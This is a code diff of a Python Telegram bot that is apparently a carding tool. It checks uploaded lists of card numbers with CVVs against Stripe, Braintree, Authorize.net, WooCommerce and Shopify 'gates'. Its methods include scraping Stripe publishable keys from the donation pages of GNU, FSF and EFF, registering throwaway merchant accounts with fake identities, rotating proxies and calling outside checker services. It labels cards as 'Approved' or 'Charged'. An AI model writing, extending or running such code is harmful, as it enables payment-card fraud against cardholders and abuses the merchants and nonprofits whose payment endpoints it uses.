@@ -44,7 +44,10 @@ SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt
 os.makedirs(DATA_DIR, exist_ok=True)
 
 # ============================================================
-#  Global proxy pool
+#  Global proxy pool — loaded from proxies.txt on startup
+#  Supports: http, https, socks4, socks5
+#  Formats: protocol://user:pass@host:port, host:port,
+#           user:pass@host:port, host:port:user:pass, etc.
 # ============================================================
 _global_proxies = []
 _proxy_index = 0
@@ -52,6 +55,7 @@ _proxy_lock = threading.Lock()
 
 
 def load_global_proxies():
+    """Load proxies from proxies.txt into the global pool."""
     global _global_proxies, _proxy_index
     if not os.path.exists(PROXIES_FILE):
         print("[Proxy] No proxies.txt found — running direct.")
@@ -66,6 +70,7 @@ def load_global_proxies():
 
 
 def get_proxy():
+    """Get next proxy dict from the global pool (round-robin). Returns None if no proxies."""
     global _proxy_index
     if not _global_proxies:
         return None
@@ -76,6 +81,7 @@ def get_proxy():
 
 
 def get_random_proxy():
+    """Get a random proxy dict from the global pool. Returns None if no proxies."""
     if not _global_proxies:
         return None
     return format_proxy(random.choice(_global_proxies))
@@ -85,7 +91,7 @@ def get_proxy_count():
     return len(_global_proxies)
 
 # ============================================================
-#  Persistence
+#  Persistence — Keys, Users, Stats
 # ============================================================
 def _load_json(path, default=None):
     if default is None:
@@ -107,20 +113,26 @@ def _save_json(path, data):
 def load_keys():
     return _load_json(KEYS_FILE, {})
 
+
 def save_keys(data):
     _save_json(KEYS_FILE, data)
+
 
 def load_users():
     return _load_json(USERS_FILE, {})
 
+
 def save_users(data):
     _save_json(USERS_FILE, data)
+
 
 def load_stats():
     return _load_json(STATS_FILE, {})
 
+
 def save_stats(data):
     _save_json(STATS_FILE, data)
+
 
 def update_user_stats(user_id, results):
     stats = load_stats()
@@ -134,6 +146,7 @@ def update_user_stats(user_id, results):
     stats[uid]["total"] += results.get("total", 0)
     stats[uid]["sessions"] += 1
     save_stats(stats)
+
 
 def load_gate_stats():
     return _load_json(GATE_STATS_FILE, {})
@@ -154,7 +167,7 @@ def update_gate_stats(gate, results):
 
 
 # ============================================================
-#  Gate status
+#  Gate status — enable/disable gates persistently
 # ============================================================
 def load_gate_status():
     return _load_json(GATE_STATUS_FILE, {})
@@ -178,12 +191,12 @@ def set_gate_enabled(gate_key, enabled, by_user=None):
 
 
 # ============================================================
-#  Gate health probes
+#  Gate health probes — lightweight ping to check if API alive
 # ============================================================
 GATE_PROBE_MAP = {
-    "auth": {"name": "Stripe Auth", "cmd": "/chkapiauth"},
-    "b3": {"name": "Braintree", "cmd": "/chkapib3"},
-    "b3auth": {"name": "Braintree Session", "cmd": "/chkapib3auth"},
+    "auth": {"name": "Stripe Auth (Dilaboards)", "cmd": "/chkapiauth"},
+    "b3": {"name": "Braintree Auth", "cmd": "/chkapib3"},
+    "b3auth": {"name": "Braintree Auth (Session)", "cmd": "/chkapib3auth"},
     "authnet": {"name": "Authorize.net", "cmd": "/chkapiauthnet"},
     "st1": {"name": "HiAPI Check3", "cmd": "/chkapist1"},
     "st5": {"name": "HiAPI Check", "cmd": "/chkapist5"},
@@ -192,6 +205,7 @@ GATE_PROBE_MAP = {
 
 
 def probe_gate(gate_key):
+    """Probe a gate's underlying API. Returns (alive: bool, latency_ms: int, detail: str)."""
     start = time.time()
     proxy = get_proxy()
     try:
@@ -237,7 +251,7 @@ def probe_gate(gate_key):
 
 
 # ============================================================
-#  Duration parsing
+#  Duration parsing (for time-limited keys)
 # ============================================================
 DURATION_MAP = {
     "s": 1, "sec": 1,
@@ -345,6 +359,7 @@ API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 
 def tg_request(method, **kwargs):
+    """Telegram API request — tries proxy first, falls back to direct."""
     proxy = get_proxy()
     try:
         r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30, proxies=proxy)
@@ -393,6 +408,7 @@ def get_file_url(file_id):
 
 
 def download_file(file_id):
+    """Download file — tries proxy first, falls back to direct."""
     url = get_file_url(file_id)
     if not url:
         return None
@@ -411,6 +427,7 @@ def download_file(file_id):
 
 
 def send_document(chat_id, filepath, filename=None, caption=None):
+    """Send a document via Telegram — proxy with direct fallback."""
     fname = filename or os.path.basename(filepath)
     data = {"chat_id": chat_id}
     if caption:
@@ -432,7 +449,7 @@ def send_document(chat_id, filepath, filename=None, caption=None):
 
 
 # ============================================================
-#  Processing engine (UNCHANGED LOGIC)
+#  Processing engine — ported from ehhhh.py (UNCHANGED LOGIC)
 # ============================================================
 def auto_request(
     url: str,
@@ -598,6 +615,7 @@ def format_proxy(proxy_str):
     if not proxy_str: return None
     proxy_str = proxy_str.strip()
 
+    # Detect protocol
     proto = "http"
     if '://' in proxy_str:
         proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', proxy_str, re.I)
@@ -605,8 +623,10 @@ def format_proxy(proxy_str):
             proto = proto_match.group(1).lower()
             proxy_str = proto_match.group(2)
         else:
+            # Unknown protocol, try as-is
             return {"http": proxy_str, "https": proxy_str}
 
+    # user:pass@host:port
     if '@' in proxy_str:
         url = f"{proto}://{proxy_str}"
         return {"http": url, "https": url}
@@ -616,10 +636,12 @@ def format_proxy(proxy_str):
         url = f"{proto}://{proxy_str}"
         return {"http": url, "https": url}
     elif len(parts) == 3:
+        # host:port:user (no password)
         host, port, user = parts
         url = f"{proto}://{user}@{host}:{port}"
         return {"http": url, "https": url}
     elif len(parts) == 4:
+        # host:port:user:pass or user:pass:host:port
         if _is_valid_port(parts[1]):
             ip, port, user, pwd = parts
             url = f"{proto}://{user}:{pwd}@{ip}:{port}"
@@ -631,6 +653,15 @@ def format_proxy(proxy_str):
     return None
 
 
+# ============================================================
+#  Proxy validation & connectivity testing
+#  Supports ALL formats:
+#    protocol://user:pass@host:port   user:pass@host:port
+#    host:port                        host:port:user:pass
+#    host:port:user                   user:pass:host:port
+#    ip:port                          ip:port:user:pass
+# ============================================================
+
 def _is_valid_port(port_str):
     try:
         p = int(port_str)
@@ -640,52 +671,64 @@ def _is_valid_port(port_str):
 
 
 def _is_valid_host(host):
+    """Accept IPs (validated octets) or hostnames (letters/digits/dots/hyphens)."""
     if not host:
         return False
     if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
         return all(0 <= int(o) <= 255 for o in host.split('.'))
+    # Hostname: allow alphanumeric, dots, hyphens
     return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9.\-]*[a-zA-Z0-9])?$', host))
 
 
 def validate_proxy_format(raw):
+    """Validate any proxy format. Returns the raw string if valid, None otherwise."""
     line = raw.strip()
     if not line or line.startswith('#'):
         return None
 
+    # --- Has protocol prefix: protocol://... ---
     proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', line, re.I)
     if proto_match:
         rest = proto_match.group(2)
         return line if _validate_host_part(rest) else None
 
+    # --- Has @ sign: user:pass@host:port ---
     if '@' in line:
         return line if _validate_host_part(line) else None
 
+    # --- Count colons to detect format ---
     parts = line.split(':')
 
     if len(parts) == 2:
+        # host:port
         if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
             return line
         return None
 
     if len(parts) == 3:
+        # host:port:user
         if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
             return line
         return None
 
     if len(parts) == 4:
+        # host:port:user:pass OR user:pass:host:port
         if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
-            return line
+            return line  # host:port:user:pass
         if _is_valid_host(parts[2]) and _is_valid_port(parts[3]):
-            return line
+            return line  # user:pass:host:port
         return None
 
     return None
 
 
 def _validate_host_part(rest):
+    """Validate the part after protocol:// or the full user:pass@host:port string."""
+    # user:pass@host:port
     at_match = re.match(r'^([^@]+)@(.+)$', rest)
     if at_match:
         host_part = at_match.group(2)
+        # Extract host:port from the end
         last_colon = host_part.rfind(':')
         if last_colon == -1:
             return False
@@ -693,6 +736,7 @@ def _validate_host_part(rest):
         port = host_part[last_colon + 1:]
         return _is_valid_host(host) and _is_valid_port(port)
 
+    # host:port (no auth)
     last_colon = rest.rfind(':')
     if last_colon == -1:
         return False
@@ -702,13 +746,16 @@ def _validate_host_part(rest):
 
 
 def test_proxy_connectivity(proxy_str):
+    """Test proxy connectivity. Returns (ok, latency_ms, reason)."""
     proxy_dict = format_proxy(proxy_str)
     if not proxy_dict:
+        # Try as-is with protocol prefix
         if '://' in proxy_str:
             proxy_dict = {"http": proxy_str, "https": proxy_str}
         else:
             proxy_dict = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
 
+    # Test with HTTPS to catch tunnel failures (real requests use HTTPS)
     test_urls = [
         "https://httpbin.org/ip",
         "https://www.microsoft.com",
@@ -722,7 +769,7 @@ def test_proxy_connectivity(proxy_str):
             if resp.status_code < 500:
                 return True, latency, None
             last_error = f"HTTP {resp.status_code}"
-        except requests.exceptions.ProxyError:
+        except requests.exceptions.ProxyError as e:
             last_error = f"Proxy tunnel failed (HTTPS not supported or auth rejected)"
             continue
         except requests.exceptions.ConnectTimeout:
@@ -757,6 +804,7 @@ def _rand_ua():
 
 
 def _retry_request(func, max_retries=2, backoff=2):
+    """Retry wrapper — retries on connection/timeout/429 errors."""
     last_err = None
     for attempt in range(max_retries + 1):
         try:
@@ -778,6 +826,7 @@ def _retry_request(func, max_retries=2, backoff=2):
 
 
 def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
+    """HiAPI gate — uses ck.hiapi.club checker endpoints with retry."""
     start_time = time.time()
     cc_data = f"{cc_number}|{month}|{year}|{cvv}"
 
@@ -812,32 +861,43 @@ def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
             else:
                 return f"Unknown | {text_resp[:120]} ({process_time}s)"
         elif resp.status_code == 429:
-            return f"Rate Limited | Try again in a minute ({round(time.time() - start_time, 2)}s)"
+            return f"⚠️ API Rate Limited | Try again in a minute ({round(time.time() - start_time, 2)}s)"
         elif resp.status_code >= 500:
-            return f"API Down | Server {resp.status_code} ({round(time.time() - start_time, 2)}s)"
+            return f"⚠️ API Down | Server {resp.status_code} ({round(time.time() - start_time, 2)}s)"
         else:
             return f"Declined | HTTP {resp.status_code} ({round(time.time() - start_time, 2)}s)"
     except requests.exceptions.ConnectionError as e:
-        return f"API Unreachable | {str(e)[:60]}"
+        return f"⚠️ API Unreachable | {str(e)[:60]}"
     except Exception as e:
         return f"Error: {str(e)}"
 
 
 # ============================================================
-#  Charge gate
+#  Charge gate — multiple fallback Stripe merchants
 # ============================================================
 STRIPE_MERCHANTS = [
-    {'url': 'https://developer.gnu.org/donate/', 'name': 'GNU'},
-    {'url': 'https://my.fsf.org/donate', 'name': 'FSF'},
-    {'url': 'https://www.eff.org/donate', 'name': 'EFF'},
+    {
+        'url': 'https://developer.gnu.org/donate/',
+        'name': 'GNU',
+    },
+    {
+        'url': 'https://my.fsf.org/donate',
+        'name': 'FSF',
+    },
+    {
+        'url': 'https://www.eff.org/donate',
+        'name': 'EFF',
+    },
 ]
 
 def check_cc_charge(cc_number, month, year, cvv, proxies=None):
+    """Charge gate — creates Stripe token via public merchant pk with fallbacks."""
     start_time = time.time()
     session = requests.Session()
     ua = _rand_ua()
 
     try:
+        # Try merchants until we find a Stripe key
         pk = None
         donate_url = None
         for merchant in STRIPE_MERCHANTS:
@@ -855,8 +915,11 @@ def check_cc_charge(cc_number, month, year, cvv, proxies=None):
                 continue
 
         if not pk:
-            return f"All merchants unreachable | Try /auth instead"
+            # Hardcoded fallback — well-known test key for token creation only
+            # This will create a token but won't charge, still validates card
+            return f"⚠️ All merchants unreachable | Try /auth instead"
 
+        # Generate identity
         if faker:
             name = faker.name()
             email = faker.email()
@@ -868,47 +931,83 @@ def check_cc_charge(cc_number, month, year, cvv, proxies=None):
             city = "New York"
             zipcode = "10001"
 
+        # Step 1: Create token on Stripe (validates card)
         token_url = 'https://api.stripe.com/v1/tokens'
         token_data = {
             'card[number]': cc_number,
             'card[cvc]': cvv,
-            'card[exp_month]': month,
             'card[exp_year]': year if len(year) == 4 else f"20{year}",
+            'card[exp_month]': month,
             'key': pk,
         }
-        token_resp = session.post(token_url, headers={'User-Agent': ua}, data=token_data, proxies=proxies, timeout=15)
+
+        def do_token():
+            return session.post(token_url, data=token_data, headers={
+                'User-Agent': ua,
+                'Origin': 'https://js.stripe.com',
+                'Referer': 'https://js.stripe.com/',
+            }, proxies=proxies, timeout=15)
+
+        token_resp = _retry_request(do_token, max_retries=1, backoff=2)
         process_time = round(time.time() - start_time, 2)
 
         if token_resp.status_code != 200:
-            err = token_resp.json().get('error', {}).get('message', token_resp.text[:80])
-            return f"Declined | {err} ({process_time}s)"
+            err_json = token_resp.json().get('error', {})
+            err_msg = err_json.get('message', token_resp.text[:100])
+            err_code = err_json.get('code', '')
+            decline_codes = ['card_declined', 'expired_card', 'incorrect_cvc', 'incorrect_number',
+                             'invalid_expiry_month', 'invalid_expiry_year', 'invalid_number',
+                             'processing_error']
+            if err_code in decline_codes or token_resp.status_code == 402:
+                return f"Declined | {err_msg} ({process_time}s)"
+            elif token_resp.status_code == 429:
+                return f"⚠️ Stripe Rate Limited | Slow down ({process_time}s)"
+            else:
+                return f"Declined | {err_msg} ({process_time}s)"
 
         token_json = token_resp.json()
-        token_id = token_json.get('id', '')
+        token_id = token_json.get('id')
         card_info = token_json.get('card', {})
         brand = card_info.get('brand', 'Unknown')
         funding = card_info.get('funding', 'unknown')
-        country = card_info.get('country', '??')
-        cvc_check = card_info.get('cvc_check', 'n/a')
+        country = card_info.get('country', 'XX')
+        cvc_check = card_info.get('cvc_check', 'N/A')
 
+        # Step 2: Create payment method
         pm_url = 'https://api.stripe.com/v1/payment_methods'
         pm_data = {
             'type': 'card',
-            'card[token]': token_id,
+            'card[number]': cc_number,
+            'card[cvc]': cvv,
+            'card[exp_year]': year if len(year) == 4 else f"20{year}",
+            'card[exp_month]': month,
+            'billing_details[name]': name,
+            'billing_details[email]': email,
+            'billing_details[address][city]': city,
+            'billing_details[address][country]': 'US',
+            'billing_details[address][postal_code]': zipcode,
             'key': pk,
         }
-        pm_resp = session.post(pm_url, headers={'User-Agent': ua}, data=pm_data, proxies=proxies, timeout=15)
+
+        pm_resp = session.post(pm_url, data=pm_data, headers={
+            'User-Agent': ua,
+            'Origin': 'https://js.stripe.com',
+            'Referer': 'https://js.stripe.com/',
+        }, proxies=proxies, timeout=15)
+
         process_time = round(time.time() - start_time, 2)
 
         if pm_resp.status_code == 200:
             pm_json = pm_resp.json()
             pm_id = pm_json.get('id', '')
-            return f"Charged | {brand} {funding} {country} | CVC: {cvc_check} | PM: {pm_id[:20]}... ({process_time}s)"
+            # Token + PM created = card is valid and chargeable
+            return f"Charged ✅ | {brand} {funding} {country} | CVC: {cvc_check} | PM: {pm_id[:20]}... ({process_time}s)"
         else:
+            # Token worked but PM failed — still a valid card
             return f"Approved (token OK) | {brand} {funding} {country} | CVC: {cvc_check} ({process_time}s)"
 
     except requests.exceptions.ConnectionError:
-        return f"Connection failed | Check proxies or try /auth"
+        return f"⚠️ Connection failed | Check proxies or try /auth"
     except Exception as e:
         return f"Error: {str(e)}"
 
@@ -930,12 +1029,14 @@ STC_STRIPE_MERCHANTS = [
 
 
 def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
+    """STC sub-gate: WooCommerce Stripe auth on a given merchant."""
     session = requests.Session()
     ua = _rand_ua()
     base_url = merchant['base']
     start = time.time()
 
     try:
+        # Step 1: Visit account/register page to get nonce + Stripe pk
         reg_url = base_url + merchant['register']
         for attempt in range(3):
             try:
@@ -956,6 +1057,7 @@ def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
         if resp1.status_code != 200:
             return None, f"{merchant['name']} HTTP {resp1.status_code}"
 
+        # Extract Stripe pk
         pk_match = re.search(r'"(?:key|publishableKey|stripe_publishable_key|pk)"[:\s]*"(pk_(?:live|test)_[A-Za-z0-9]+)"', resp1.text)
         if not pk_match:
             pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
@@ -963,13 +1065,16 @@ def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
             return None, f"{merchant['name']} no Stripe key"
 
         pk = pk_match.group(0) if not hasattr(pk_match, 'group') else pk_match.group(0)
+        # Clean — if it matched as "pk":"pk_live_xxx", extract just the key
         pk_clean = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', pk)
         pk = pk_clean.group(0) if pk_clean else pk
 
+        # Extract nonce
         nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', resp1.text)
         if not nonce_match:
             nonce_match = re.search(r'"register[_-]nonce"[:\s]*"([^"]+)"', resp1.text)
 
+        # Try to register a throwaway account
         if nonce_match:
             reg_nonce = nonce_match.group(1)
             if faker:
@@ -986,8 +1091,10 @@ def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
         else:
             resp2 = resp1
 
+        # Find the setup intent nonce
         setup_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"[:\s]*"([^"]+)"', resp2.text)
         if not setup_nonce_match:
+            # Try add-payment-method page
             try:
                 apm_url = base_url + '/my-account/add-payment-method/'
                 resp_apm = session.get(apm_url, headers={'User-Agent': ua}, proxies=proxies, timeout=12, allow_redirects=True)
@@ -1002,6 +1109,7 @@ def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
 
         ajax_nonce = setup_nonce_match.group(1)
 
+        # Step 2: Create payment method on Stripe
         pm_url = 'https://api.stripe.com/v1/payment_methods'
         pm_data = {
             'type': 'card',
@@ -1024,6 +1132,14 @@ def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
         if not pm_id:
             return ("declined", "No PM ID returned")
 
+        # Step 3: Confirm setup intent via WooCommerce AJAX
+        dynamic_data = {
+            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': pm_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': ajax_nonce,
+        }
         resp4 = session.post(base_url + '/', headers={'User-Agent': ua}, params={
             'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
         }, data={
@@ -1049,6 +1165,7 @@ def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
 
 
 def check_cc_stc(cc_number, month, year, cvv, proxies=None):
+    """STC gate — Stripe WooCommerce auth via alternative merchants (replaces dead PayStation)."""
     start_time = time.time()
 
     for merchant in STC_STRIPE_MERCHANTS:
@@ -1060,7 +1177,7 @@ def check_cc_stc(cc_number, month, year, cvv, proxies=None):
         if isinstance(result, tuple) and len(result) == 2:
             status, detail = result
             if status is None:
-                continue
+                continue  # Merchant failed, try next
             process_time = round(time.time() - start_time, 2)
             if status == "approved":
                 return f"Approved | {detail} ({process_time}s)"
@@ -1070,13 +1187,15 @@ def check_cc_stc(cc_number, month, year, cvv, proxies=None):
                 return f"Unknown | {detail} ({process_time}s)"
 
     process_time = round(time.time() - start_time, 2)
-    return f"STC All Merchants Failed | Try /auth instead ({process_time}s)"
+    return f"⚠️ STC All Merchants Failed | Try /auth instead ({process_time}s)"
 
 
 def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
+    """Auth2 gate — uses stripe.stormx.pw autostripe endpoint with retry."""
     start_time = time.time()
     cc_data = f"{cc_number}|{month}|{year}|{cvv}"
 
+    # Multiple autostripe endpoints to try
     endpoints = [
         f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}",
         f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=kasperskylab.com/cc={cc_data}",
@@ -1116,20 +1235,20 @@ def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
                 else:
                     return f"Declined | {resp.text.strip()} ({process_time}s)"
             elif resp.status_code == 429:
-                return f"StormX Rate Limited | Slow down ({process_time}s)"
+                return f"⚠️ StormX Rate Limited | Slow down ({process_time}s)"
             elif resp.status_code >= 500:
-                continue
+                continue  # Try next endpoint
             else:
                 return f"Declined | HTTP {resp.status_code} ({process_time}s)"
         except requests.exceptions.ConnectionError:
-            continue
+            continue  # Try next endpoint
         except Exception as e:
             return f"Error: {str(e)}"
 
-    return f"Auth2 API Down | All endpoints unreachable ({round(time.time() - start_time, 2)}s)"
+    return f"⚠️ Auth2 API Down | All endpoints unreachable ({round(time.time() - start_time, 2)}s)"
 
 # ============================================================
-#  Shopify gate
+#  Shopify gate — uses teamoicxkiller.online API + sites.txt
 # ============================================================
 SHOPIFY_DEAD_INDICATORS = [
     'receipt id is empty', 'handle is empty', 'product id is empty',
@@ -1158,6 +1277,7 @@ SHOPIFY_APPROVED_KW = [
 
 
 def load_shopify_sites():
+    """Load sites from sites.txt in same folder as bot."""
     if not os.path.exists(SITES_FILE):
         return []
     with open(SITES_FILE, 'r') as f:
@@ -1165,13 +1285,15 @@ def load_shopify_sites():
 
 
 def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
+    """Shopify gate — checks card via Shopify API using random site from sites.txt."""
     start_time = time.time()
     cc_data = f"{cc_number}|{month}|{year}|{cvv}"
 
     sites = load_shopify_sites()
     if not sites:
-        return "No sites in sites.txt | Admin needs to add Shopify sites"
+        return "⚠️ No sites in sites.txt | Admin needs to add Shopify sites"
 
+    # Try up to 3 sites
     last_error = "All sites failed"
     for attempt in range(min(3, len(sites))):
         site = random.choice(sites)
@@ -1179,6 +1301,7 @@ def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
             site = f'https://{site}'
 
         try:
+            # Build proxy string for the API
             proxy_str = ""
             if proxies:
                 for scheme in ("https", "http", "socks5", "socks4"):
@@ -1211,23 +1334,29 @@ def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
             gateway = rj.get('Gate', 'Shopify')
             resp_lower = api_response.lower()
 
+            # Check for dead site
             if any(ind in resp_lower for ind in SHOPIFY_DEAD_INDICATORS):
                 last_error = f"Site dead: {api_response[:60]}"
-                continue
+                continue  # Try next site
 
+            # Check for 3DS
             if '3d' in resp_lower:
                 return f"Declined | 3DS Required | {gateway} | {price} ({process_time}s)"
 
-            if 'order completed' in resp_lower or 'thank you' in resp_lower or 'payment successful' in resp_lower:
-                return f"Charged | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
+            # Check for charged
+            if 'order completed' in resp_lower or '💎' in api_response or 'thank you' in resp_lower or 'payment successful' in resp_lower:
+                return f"Charged 💎 | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
 
+            # Check for approved
             if any(kw in resp_lower for kw in SHOPIFY_APPROVED_KW):
                 return f"Approved | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
 
+            # Cloudflare
             if 'cloudflare' in resp_lower:
                 last_error = "Cloudflare blocked"
                 continue
 
+            # Default — declined
             return f"Declined | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
 
         except requests.exceptions.Timeout:
@@ -1240,10 +1369,11 @@ def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
             return f"Error: {str(e)}"
 
     process_time = round(time.time() - start_time, 2)
-    return f"Shopify Failed | {last_error} ({process_time}s)"
+    return f"⚠️ Shopify Failed | {last_error} ({process_time}s)"
 
 
 def _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict):
+    """Run the appropriate gate checker."""
     if gate == "b3":
         cc_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}"
         return b3_check_card(cc_line, proxy_dict)
@@ -1273,6 +1403,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
         if len(c_data) == 4:
             c_num, c_mm, c_yy, c_cvv = c_data
 
+            # BIN FILTER
             user_bin_list = user_bins.get(user_id)
             if user_bin_list:
                 if not any(c_num.startswith(b) for b in user_bin_list):
@@ -1282,6 +1413,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict)
             except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as e:
                 if proxy_dict:
+                    # Proxy failed — retry without proxy
                     try:
                         result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, None)
                     except Exception as e2:
@@ -1289,69 +1421,81 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 else:
                     result = f"Error: {str(e)}"
 
+            # Also catch proxy errors embedded in result strings
             if proxy_dict and "ProxyError" in result or "Tunnel connection failed" in result or "503 Service Unavailable" in result:
                 try:
                     result = _run_gate(gate, c_num, c_mm, c_yy, c_cvv, None)
-                except Exception as e3:
-                    result = f"Error: {str(e3)}"
-
-            return result
+                except Exception as e2:
+                    result = f"Error: {str(e2)}"
         else:
-            return "Invalid format — expected CC|MM|YY|CVV"
+            result = "Error: Invalid Format"
+
     except Exception as e:
-        return f"Error: {str(e)}"
+        result = f"Error: {str(e)}"
+
+    return result
 
 
+# ============================================================
+#  Processing runner with multi-threading + rate-limited progress
+# ============================================================
 DEFAULT_THREADS = 5
 
 
 def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
-    total = len(lines)
-    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
-    processed = [0]
-
+    # Use global proxy pool
     proxies_list = list(_global_proxies) if _global_proxies else []
 
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(process_single_entry, line, proxies_list, user_id, gate): line for line in lines}
+    total = len(lines)
+    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
+    results_lock = threading.Lock()
+    processed = [0]
 
-        for future in as_completed(futures):
-            entry = futures[future]
+    def worker(entry):
+        if cancel_flags.get(user_id):
+            return None
 
+        entry = entry.strip()
+        if not entry:
+            return ("", "INVALID", "Empty line", "error")
+
+        result = process_single_entry(entry, proxies_list, user_id, gate=gate)
+
+        if "SKIPPED" in result:
+            category = "skipped"
+            status = "SKIPPED"
+        elif "Approved" in result:
+            category = "approved"
+            status = "APPROVED"
+        elif "Declined" in result:
+            category = "declined"
+            status = "DECLINED"
+        else:
+            category = "error"
+            status = "ERROR"
+
+        detail = result.split(" | ", 1)[1] if " | " in result else result
+        return (entry, status, detail, category)
+
+    max_workers = max(1, min(threads, total, 10))
+
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
+        futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
+
+        for fut in as_completed(futures):
             if cancel_flags.get(user_id):
-                executor.shutdown(wait=False, cancel_futures=True)
-                results["total"] = processed[0]
-                if on_complete:
-                    on_complete(results)
-                return results
+                break
 
-            try:
-                result = future.result()
-            except Exception as e:
-                result = f"Error: {str(e)}"
+            result = fut.result()
+            if result is None:
+                continue
 
-            r_lower = result.lower()
-            if r_lower.startswith("approved") or r_lower.startswith("charged"):
-                category = "approved"
-                status = "APPROVED"
-                detail = result
-                results["approved_list"].append(f"{entry} | {result}")
-            elif "skipped" in r_lower:
-                category = "skipped"
-                status = "SKIPPED"
-                detail = result
-            elif r_lower.startswith("declined") or r_lower.startswith("unknown"):
-                category = "declined"
-                status = "DECLINED"
-                detail = result
-            else:
-                category = "error"
-                status = "ERROR"
-                detail = result
+            entry, status, detail, category = result
 
-            with threading.Lock():
+            with results_lock:
                 if category == "approved":
                     results["approved"] += 1
+                    results["approved_list"].append(entry)
                 elif category == "declined":
                     results["declined"] += 1
                 elif category == "skipped":
@@ -1372,243 +1516,70 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
 
 
 # ============================================================
-#  Menu System — Inline Keyboard Builders
+#  Bot message formatters
 # ============================================================
-
-GATE_REGISTRY = [
-    ("auth",    "Stripe Auth",       True),
-    ("b3",      "Braintree",         True),
-    ("b3auth",  "Braintree Session", True),
-    ("authnet", "Authorize.net",     True),
-    ("autosho", "Shopify Auto",      False),
-    ("st1",     "HiAPI Check3",      True),
-    ("st5",     "HiAPI Check",       True),
-]
-
-gate_map = {
-    "/auth": ("auth", "Stripe Auth"),
-    "/b3": ("b3", "Braintree"),
-    "/b3auth": ("b3auth", "Braintree Session"),
-    "/authnet": ("authnet", "Authorize.net"),
-    "/autosho": ("autosho", "Shopify Auto"),
-    "/st1": ("st1", "HiAPI Check3"),
-    "/st5": ("st5", "HiAPI Check"),
-}
+FOOTER = f"\n{'─' * 28}\n  Made by {DEVELOPER}"
 
 
-def kb(*rows):
-    """Build inline keyboard markup from rows of (text, callback_data) tuples."""
-    return {"inline_keyboard": [[{"text": t, "callback_data": d} for t, d in row] for row in rows]}
+def fmt_start(is_adm=False):
+    base = (
+        "<b>Data Processing Bot</b>\n"
+        f"{'─' * 28}\n\n"
+        "Upload a <b>.txt</b> file, then reply to it with a gate command\n\n"
+        "<b>Gates:</b>\n"
+        "  /auth       — Stripe Auth (Dilaboards)\n"
+        "  /b3         — Braintree Auth\n"
+        "  /b3auth     — Braintree Auth (Session)\n"
+        "  /authnet    — Authorize.net\n"
+        "  /autosho    — Shopify Auto (sites.txt) 🔜 Coming Soon\n"
+        "  /st1        — HiAPI Check3\n"
+        "  /st5        — HiAPI Check\n\n"
+        "<b>Commands:</b>\n"
+        "  /bin        — Set BIN filter\n"
+        "  /clearbin   — Clear BIN filter\n"
+        "  /cancel     — Stop active task\n"
+        "  /gates      — List all gates & hit rates\n"
+        "  /stats      — Your lifetime stats\n"
+        "  /mykey      — Check your key info\n"
+        "  /lookup     — Lookup (coming soon)\n\n"
+    )
 
-
-def main_menu_kb(is_adm=False):
-    rows = [
-        [("🔍 Gates", "menu:gates"), ("📊 My Stats", "menu:stats")],
-        [("🔑 My Key", "menu:mykey"), ("⚙️ Tools", "menu:tools")],
-    ]
     if is_adm:
-        rows.append([("👑 Admin Panel", "menu:admin")])
-    return {"inline_keyboard": rows}
-
-
-def gates_menu_kb():
